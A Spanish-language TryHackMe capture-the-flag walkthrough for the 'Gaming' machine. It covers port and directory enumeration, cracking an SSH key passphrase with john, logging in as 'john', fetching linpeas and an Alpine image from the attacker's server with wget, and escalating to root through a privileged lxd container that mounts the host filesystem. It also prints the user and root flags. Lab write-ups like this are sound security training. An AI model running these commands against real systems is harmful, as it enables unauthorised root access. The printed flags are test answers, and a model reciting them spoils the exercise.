# Writeup Gaming - TryHackMe

| **Información** | **Detalle** |
| :--- | :--- |
| **IP** | 10.129.167.198 |
| **Plataforma** | TryHackMe |
| **Sistema Operativo** | Linux |
| **Dificultad** | Fácil |

---

## Tabla de Contenidos

1. [Reconocimiento](#reconocimiento)
2. [Enumeración](#enumeración)
3. [Explotación](#explotación)
4. [Escalada de Privilegios](#escalada-de-privilegios)
5. [Flags](#flags)

---

## Reconocimiento

Lo primero que vamos a hacer, es un escaneo inicial de puertos, para saber que tenemos entre nuestras manos:


```bash
sudo nmap -sC -sV -Pn -sS -p- 10.129.167.198 -oN scan_spice.txt
```


### Resultados del Escaneo


```bash
Nmap scan report for 10.129.167.198
Host is up (0.049s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
---

## Enumeración

Podemos ver de que hay dos puertos abiertos en la máquina, SSH y HTTP. Vamos a usar gobuster para ver si hay algún directorio oculto.

```bash
gobuster dir -u http://10.129.167.198 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,sh
```

Al dejar un rato intentando enumerar directorios ocultos, hemos encontrado dos directorios: "/uploads" y "/secret". Vamos a acceder a ellos y ver lo que hay

![contenido uploads](/imgGaming/image.png)

En la carpeta uploads, hemos encontrado 3 archivos, una imagen con un meme, un manifesto del hacker en .txt, y un diccionario, por lo que se intuye que será una de las posibles entradas al equipo (mediante fuerza bruta).

![contenido secret](/imgGaming/image2.png)


![mensaje secreto](/imgGaming/image3.png)

Interesante. Hay un mensaje encriptado dentro en RSA, por lo que podemos intentar desencriptarlo usando ssh2john y crackeando el hash.

```bash
ssh2john gaming.txt > gaming.hash
```

```bash
john gaming.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```bash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 3 OpenMP threads
Proceeding with wordlist:/usr/share/john/password.lst
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (rsa.txt)     
1g 0:00:00:00 DONE (2026-04-01 06:44) 33.33g/s 1600p/s 1600c/s 1600C/s ranger..diamond
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Interesante. Tenemos la contraseña del RSA, por lo que falta buscar el posible usuario dentro de la página. Un truco clásico es mirar el código fuente de la propia página en busca de comentarios o texto oculto.

![codigo fuente](/imgGaming/image4.png)

Vale, al parecer tenemos un posible usuario, llamado "john" escondido en el código fuente de la página principal de la página, por lo que vamos a probar a usar la clave RSA recién crackeada y el usuario para entrar a la máquina.

---

## Explotación

[CONTENIDO DE EXPLOTACIÓN]

```bash
ssh john@10.129.167.198 -i id_rsa
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)

john@exploitable:~$ ls
user.txt
john@exploitable:~$ cat user.txt
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```

¡Ya tenemos la flag del usuario! Ahora vamos a intentar obtener la flag de root.

---

## Escalada de Privilegios

Ahora, esto es extraño, como no sabemos la contraseña de "john", vamos a intentar usar una herramienta llamada "linpeas.sh" para ver si hay alguna vulnerabilidad en la máquina.

Para ello descargamos el script en la máquina atacante:

```bash
https://github.com/peass-ng/PEASS-ng/releases/tag/20260401-839ada8a
```

Abrimos el servidor web en la máquina atacante (sin olvidar de dar permisos de ejecución al script):

```bash
python3 -m http.server
sudo chmod +x linpeas.sh
```

Y en la máquina victima, descargamos el script y lo corremos (en mi caso, lo he descargado en la carpeta /tmp):

```bash
wget http://[IP_ADDRESS]/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

![resultados](/imgGaming/image5.png)

Podemos ver de que root ejecuta un proceso llamado "lxd" con permisos de ejecución para el usuario "john". Por lo que vamos a intentar obtener una shell como root.

Para ello, usaremos un repo de GitHub, llamado "https://github.com/saghul/lxd-alpine-builder", que nos permitira ejecutar la escalada de privilegios. Lo primero que hay que hacer, al clonar el equipo, es crear una imagen de alpine, con el comando:

```bash
sudo ./build-alpine.sh
```
Al crear la imagen, como tenemos aún abierto el servidor Python del paso anterior, podemos simplemente copiarlo a la carpeta donde esté alojado y descargarlo desde la máquina victima:

```bash
wget http://[IP_ADDRESS]/alpine-v3.23-x86_64-20260401_0722.tar.gz
```
Ahora que tenemos la imagen descargada (siempre teniendo la carpeta /tmp como base), vamos a importar dicha imagen a la máquina.

```bash
lxc image import ./alpine-v3.23-x86_64-20260401_0722.tar.gz --alias hack
Image imported with fingerprint: e328deddb06aeaeae63a4c181cbdc320d339f097e59204dab0dc635b41ec6ff
```

Después, vamos a iniciar la imagen, con el comando:

```bash
lxc init hack contenedor1 -c security.privileged=true
```

Después, montamos el contenedor recién creado con:

```bash
lxc config device add contenedor1 mydevice disk source=/ path=/mnt/root recursive=true
```

Y iniciamos sesión en el contenedor:

```bash
lxc start contenedor1
lxc exec contenedor1 -- /bin/sh
```

¡Tenemos acceso como root!. Vamos a navegar a la carpeta /root para obtener la flag.

```bash
whoami
root
/mnt/root/root # ls
root.txt
/mnt/root/root # cat root.txt
2e337b8c9f3aff0c2b3e8d4e6a7c88fc
/mnt/root/root # 
```

---

## Flags

- **User Flag**: a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
- **Root Flag**: 2e337b8c9f3aff0c2b3e8d4e6a7c88fc
